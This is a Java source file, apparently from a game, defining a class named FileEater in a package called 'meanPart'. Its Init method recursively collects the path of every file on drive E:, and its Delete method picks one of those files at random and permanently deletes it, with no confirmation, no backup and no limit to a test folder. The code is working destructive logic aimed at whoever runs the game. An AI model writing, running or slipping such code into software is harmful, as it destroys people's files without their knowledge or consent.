package meanPart;

import Boot.Game;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class FileEater {

    private static List<String> fileList;
    public static List<String> getFilesFromDirectory(File directory) {
        List<String> fileList = new ArrayList<>();

        if (directory.exists() && directory.isDirectory()) {
            File[] files = directory.listFiles(); // Get files and subdirectories

            if (files != null) {
                for (File file : files) {
                    if (file.isFile()) {
                        fileList.add(file.getAbsolutePath()); // Add file path to the list
                    } else if (file.isDirectory()) {
                        // Recursive call for subdirectories
                        fileList.addAll(getFilesFromDirectory(file));
                    }
                }
            }
        }

        return fileList;
    }

    public static void Init(){
        String rootDirectory = "E:\\";

        // Call the method to list all files
        fileList = getFilesFromDirectory(new File(rootDirectory));

        // Print the file list
        for (String filePath : fileList) {
            System.out.println(filePath);
        }
    }





    public static void Delete(){
        Random random = new Random();
        int fileIndex = random.nextInt(0,fileList.size());
        String filePathToDelete = fileList.get(fileIndex);
        File fileToDelete = new File(filePathToDelete);
        Game.DELETING = true;
        if (fileToDelete.delete()) {
            System.out.println("File deleted successfully: " + filePathToDelete);
        } else {
            System.out.println("Failed to delete the file. It might be in use or you lack sufficient permissions.");
        }
        fileList.remove(fileIndex);
        Game.DELETING = false;

    }
}
